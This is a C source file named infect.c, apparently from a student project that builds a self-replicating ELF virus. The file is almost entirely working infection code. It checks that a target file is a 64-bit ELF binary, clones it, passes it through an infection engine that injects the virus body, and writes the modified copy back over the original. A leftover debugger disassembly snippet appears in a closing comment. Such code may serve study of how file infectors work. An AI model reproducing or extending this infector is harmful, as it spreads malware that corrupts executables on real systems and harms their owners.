/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
/*   Updated: 2021/06/15 16:22:42 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "accessors.h"
#include "errors.h"
#include "log.h"
#include "syscall.h"
#include "utils.h"
#include "virus.h"
#include "compiler_utils.h" // TODO tmp for ALIGN(virus_size)

static bool	is_elf64(const char *file)
{
	Elf64_Ehdr	hdr;
	int		fd = sys_open(file, O_RDONLY);

	if (fd < 0) return errors(ERR_SYS, _ERR_OPEN_FAILED);

	if (sys_read(fd, &hdr, sizeof(Elf64_Ehdr)) < (ssize_t)sizeof(Elf64_Ehdr))
	{
		sys_close(fd);
		return errors(ERR_USAGE, _ERR_NOT_ELF);
	}

	if (memcmp(hdr.e_ident, (char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3}, SELFMAG) != 0 // wrong Magic
	|| hdr.e_ident[EI_CLASS] != ELFCLASS64        // not 64bit
	|| hdr.e_ident[EI_DATA] != ELFDATA2LSB        // not little endian
	|| hdr.e_entry == 0                           // no entry point
	|| hdr.e_phoff == 0                           // no program hdr table
	|| hdr.e_shoff == 0)                          // no section hdr table
	{
		sys_close(fd);
		return errors(ERR_USAGE, _ERR_NOT_ELF);
	}

	sys_close(fd);
	return true;
}

inline bool	infect(struct virus_header *vhdr, const char *file)
{
	struct safe_ptr	original_ref = {.ptr = NULL, .size = 0};
	struct safe_ptr	clone_ref    = {.ptr = NULL, .size = 0};
	size_t		virus_size   = vhdr->virus_size;
	size_t		extra_size   = virus_size * 2;

	log_try_infecting(file);

	if (!is_elf64(file)
	|| !init_original_safe(&original_ref, file)
	|| !init_clone_safe(&clone_ref, original_ref.size, extra_size)
	|| !infection_engine(vhdr, clone_ref, original_ref)
	|| !write_file((struct safe_ptr){clone_ref.ptr, original_ref.size + ALIGN(vhdr->virus_size, PAGE_ALIGNMENT)}, file))
	{
		free_accessor(&original_ref);
		free_accessor(&clone_ref);
		return errors(ERR_THROW, _ERR_INFECT);
	}
	free_accessor(&original_ref);
	free_accessor(&clone_ref);

	log_success();
	return true;
}

/*
0x4299ed:	mov    rax,QWORD PTR [rbp-0x28]
=> 0x4299f1:	mov    cl,BYTE PTR [rax]
0x4299f3:	mov    rax,QWORD PTR [rbp-0x20]
0x4299f7:	mov    BYTE PTR [rax],cl
0x4299f9:	mov    rax,QWORD PTR [rbp-0x20]
*/
